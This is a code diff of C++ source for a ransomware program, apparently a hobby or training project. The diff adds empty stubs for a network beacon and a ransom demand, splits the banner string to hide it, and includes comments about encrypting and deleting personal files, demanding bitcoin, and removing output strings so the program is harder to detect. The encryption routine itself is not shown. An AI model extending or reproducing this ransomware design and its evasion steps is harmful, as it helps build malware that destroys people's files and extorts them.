@@ -341,9 +341,35 @@ DWORD FindFiles()
 }
 
 
+void SendBeacon()
+{
+	// TODO
+}
+
+void RansomMessage()
+{
+	// TODO
+}
+
 int main(int argc, char* argv[])
 { 
-    std::cout << "Welcome to T.R.O.U.B.L.E. ..." << std::endl;
+	std::string Banner1 = "We";
+	std::string Banner2 = "lc";
+	std::string Banner3 = "om";
+	std::string Banner4 = "e ";
+	std::string Banner5 = "to";
+	std::string Banner6 = " t";
+	std::string Banner7 = "he";
+	std::string Banner8 = " M";
+	std::string Banner9 = "at";
+	std::string Banner10 = "ri";
+	std::string Banner11 = "x!";
+	std::string Banner12 = "!!";
+	std::string Banner13 = " ...";
+	// Obfuscating this string
+	std::string BannerFinal = Banner1.append(Banner2).append(Banner3).append(Banner4).append(Banner5).append(Banner6).append(Banner7).append(Banner8).append(Banner9).append(Banner10).append(Banner11).append(Banner12).append(Banner13);
+
+    std::cout << BannerFinal << std::endl;
 
 	if (argc > 1)
 	{
@@ -356,23 +382,22 @@ int main(int argc, char* argv[])
 	if (v)
 		std::cout << "Verbosity: Enabled" << std::endl;
 
-	// Decode library strings 
 
-	// Load necessary libraries via LoadLibrary
-
-	// Find files to encrypt 
-	// documents (doc, docx, pdf, xls, ppt, etc)
-	// images (jpg, png, etc)
-	// video (mp4, mpg, etc)
-	FindFiles(); // Finds, Encrypts, and Deletes important personal files
+	// Finds, Encrypts, and Deletes important personal files
+	FindFiles(); 
 
 	// Send network beacon to report ransom completed
+	SendBeacon();
 
 	// Display message to user demanding bitcoin payment 
+	RansomMessage();
 
-	// Do we care about providing a decryption option?
+	// Question: Do we care about providing a decryption option?
 
-	std::cout << std::endl;
-	std::cout << "All Your Files Are Belong To Us!!! :\\" << std::endl;
+	// Question: For the final version, I think we should comment out all 
+	// of the std::cout calls in all supporting functions to minimize the 
+	// discoverable strings.  Thoughts?
+
+	std::cout << std::endl << "All Your Files Are Belong To Us!!! :\\" << std::endl;
 
 }
